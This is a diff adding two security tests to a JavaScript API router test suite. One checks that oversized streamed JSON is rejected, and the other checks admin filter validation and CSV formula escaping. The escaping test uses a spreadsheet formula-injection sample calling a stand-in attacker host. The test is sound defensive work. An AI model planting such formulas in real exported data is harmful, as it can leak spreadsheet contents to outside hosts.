@@ -78,6 +78,28 @@ describe("central API router security", () => {
     });
   });
 
+  it("rejects oversized streamed JSON requests without content-length", async () => {
+    const { createApiHandler, apiJson } = await import("@/lib/api/router");
+    const POST = createApiHandler("submissions.create", async () =>
+      apiJson({ ok: true }),
+    );
+
+    const response = await POST(
+      submissionRequest({
+        fields: {
+          name: "Large Payload",
+          description: "x".repeat(70 * 1024),
+        },
+      }),
+    );
+
+    expect(response.status).toBe(413);
+    await expect(response.json()).resolves.toMatchObject({
+      ok: false,
+      error: { code: "payload_too_large" },
+    });
+  });
+
   it("rejects invalid JSON content type for body-backed endpoints", async () => {
     const { createApiHandler, apiJson } = await import("@/lib/api/router");
     const POST = createApiHandler("submissions.create", async () =>
@@ -246,6 +268,21 @@ describe("central API router security", () => {
       ok: false,
       error: { code: "unauthorized" },
     });
+  });
+
+  it("rejects invalid admin lead status filters and neutralizes CSV formulas", async () => {
+    expect(() =>
+      apiRouteDefinitions["adminListingLeads.list"].querySchema?.parse({
+        status: "peding_review",
+      }),
+    ).toThrow();
+
+    const { csvEscape } = await import("@/lib/csv");
+    expect(csvEscape('=IMPORTXML("https://attacker.invalid")')).toBe(
+      '"\'=IMPORTXML(""https://attacker.invalid"")"',
+    );
+    expect(csvEscape("+Example")).toBe("'+Example");
+    expect(csvEscape("@payload")).toBe("'@payload");
   });
 
   it("validates reviewed D1 job payloads before admin route code runs", () => {
